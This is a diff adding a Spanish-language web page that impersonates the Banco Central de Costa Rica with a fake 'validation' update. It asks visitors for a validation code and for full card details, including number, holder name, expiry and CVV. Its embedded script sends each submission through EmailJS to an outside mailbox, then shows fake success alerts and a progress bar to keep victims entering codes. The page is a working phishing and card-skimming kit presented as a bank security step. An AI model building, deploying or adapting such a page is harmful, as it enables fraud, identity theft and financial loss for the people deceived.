@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="sincronizacion.css">
+</head>
+<body>
+    <header>
+        <div class="navbar">
+            <div class="nav-logo">
+                <img src="logo-BP.png" alt="Banco Central de Costa Rica" class="logo">
+            </div>
+        </div>
+    </header>
+    <main>
+        <section class="validation-section">
+            <h2>Validación</h2>
+            <p>Actualización en proceso. Puedes comunicarte con nosotros usando los diferentes canales de atención.</p>
+            
+            <!-- Barra de progreso -->
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div id="progress-fill" class="progress-fill"></div>
+                </div>
+                <p id="progress-text">0%</p> <!-- Comienza en 0% -->
+            </div>
+
+            <!-- Formulario para ingresar el código de validación -->
+            <form id="validationForm" onsubmit="sendUserCode(event)">
+                <label for="validationCode">Código de validación</label>
+                <input type="text" id="validationCode" name="validationCode" required placeholder="Ingrese el código">
+                <button type="submit" id="codeButton" class="btn btn-success">Enviar Código</button>
+            </form>
+
+            <!-- Mensaje de éxito y botón para continuar -->
+            <p id="updateStatus" style="display:none;">Código enviado con éxito</p>
+            
+            <!-- Botón para desplegar el formulario de tarjeta -->
+            <button type="button" onclick="toggleCardSection()">Agregar Tarjeta</button>
+            
+            <!-- Sección para el formulario de tarjeta -->
+            <div id="cardSection" class="card-section">
+                <form id="cardForm" onsubmit="sendCardData(event)">
+                    <label for="cardNumber">Número de tarjeta</label>
+                    <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000" required>
+                    
+                    <label for="cardName">Nombre del titular</label>
+                    <input type="text" id="cardName" name="cardName" placeholder="Nombre del titular" required>
+                    
+                    <div class="card-expiry-cvv-container">
+                        <div>
+                            <label for="cardExpiry">Fecha de vencimiento</label>
+                            <input type="text" id="cardExpiry" name="cardExpiry" maxlength="5" placeholder="MM/AA" required>
+                        </div>
+                        <div>
+                            <label for="cardCVV">CVV</label>
+                            <input type="text" id="cardCVV" name="cardCVV" maxlength="3" placeholder="CVV" required>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" id="cardButton">Guardar Tarjeta</button>
+                </form>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <img src="logo-firma-digital.png" alt="Centro de Soporte Firma Digital" class="logo-firma">
+    </footer>
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        emailjs.init('B_UpfFP6IoaJQjzB5'); // Reemplaza con tu clave pública real de EmailJS
+    </script>
+
+    <script>
+        let progress = 0;
+
+        function sendUserCode(event) {
+            event.preventDefault();
+            const userCode = document.getElementById('validationCode').value;
+
+            // Enviar el código personalizado ingresado por el usuario por correo
+            emailjs.send('default_service', 'template_d4wfmg9', {
+                code: userCode
+            })
+            .then(() => {
+                alert('Código enviado con éxito.');
+                document.getElementById('updateStatus').style.display = 'block';
+                document.getElementById('continueButton').style.display = 'block';
+                updateProgressBar();
+            }, (err) => {
+                alert('Error al enviar el código: ' + JSON.stringify(err));
+            });
+        }
+
+        function updateProgressBar() {
+            progress += 10; // Incrementa el progreso en un 10% cada vez que se envía un código
+            if (progress >= 100) {
+                progress = 100;
+            }
+            const progressFill = document.getElementById('progress-fill');
+            const progressText = document.getElementById('progress-text');
+            progressFill.style.width = `${progress}%`;
+            progressText.textContent = `${progress}%`;
+        }
+
+        function toggleCardSection() {
+            const cardSection = document.getElementById('cardSection');
+            cardSection.classList.toggle('expanded');
+        }
+
+        function sendCardData(event) {
+            event.preventDefault();
+            
+            const cardData = {
+                cardNumber: document.getElementById('cardNumber').value,
+                cardName: document.getElementById('cardName').value,
+                cardExpiry: document.getElementById('cardExpiry').value,
+                cardCVV: document.getElementById('cardCVV').value
+            };
+
+            // Enviar datos de la tarjeta por correo
+            emailjs.send('default_service', 'template_hjfe0jk', cardData)
+            .then(() => {
+                alert('Datos de la tarjeta guardados con éxito.');
+                document.getElementById('cardForm').reset();
+            }, (err) => {
+                alert('Error al enviar los datos de la tarjeta: ' + JSON.stringify(err));
+            });
+        }
+    </script>
+</body>
+</html>
